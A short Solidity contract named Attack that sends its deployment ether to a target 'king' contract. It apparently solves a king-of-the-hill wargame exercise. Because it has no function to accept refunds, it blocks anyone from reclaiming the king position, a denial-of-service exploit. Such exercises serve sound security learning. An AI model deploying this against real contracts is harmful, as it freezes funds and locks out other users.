// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract Attack {
    address payable public king;
    uint256 public warchest;

    constructor(address payable _address) payable{
        king = _address;
        warchest = msg.value;
    }

    function attack() public {
        (bool sent, ) = king.call{value: warchest}("");
        require(sent, "Failed to send ether");
    }
}
